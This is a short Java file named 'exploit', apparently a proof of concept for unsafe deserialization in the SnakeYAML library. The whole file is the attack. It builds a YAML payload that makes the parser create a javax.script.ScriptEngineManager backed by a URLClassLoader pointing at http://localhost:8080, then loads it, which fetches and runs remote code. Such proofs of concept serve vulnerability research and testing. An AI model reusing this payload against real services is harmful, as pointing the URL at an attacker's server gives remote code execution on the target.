// comment this file when you run Poc.java

package org.example;

import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Map;

public class exploit {
    public static void main(String[] args) {

        String vector = "some_var: !!javax.script.ScriptEngineManager " +
                "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080\"]]]]";
        InputStream is = new ByteArrayInputStream(vector.getBytes());

        Yaml yaml = new Yaml(new Constructor(Test1.class));
        Map<String, Object> obj = yaml.load(is);
    }
}

class Test1 {
    public String some_var = "abc";
}
